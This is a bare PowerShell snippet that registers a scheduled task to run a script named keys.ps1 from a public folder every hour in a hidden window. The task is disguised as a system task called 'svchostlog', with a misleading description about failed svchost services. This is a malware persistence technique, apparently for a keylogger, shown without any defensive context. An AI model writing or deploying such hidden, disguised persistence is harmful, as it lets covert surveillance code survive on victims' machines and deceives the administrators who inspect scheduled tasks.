

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
	-Argument '-NoProfile -WindowStyle Hidden C:\Users\Public\keys.ps1'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 60)
Register-ScheduledTask -Action $action -trigger $trigger -TaskName "svchostlog" -Description "Daily dump of failed svchost services"
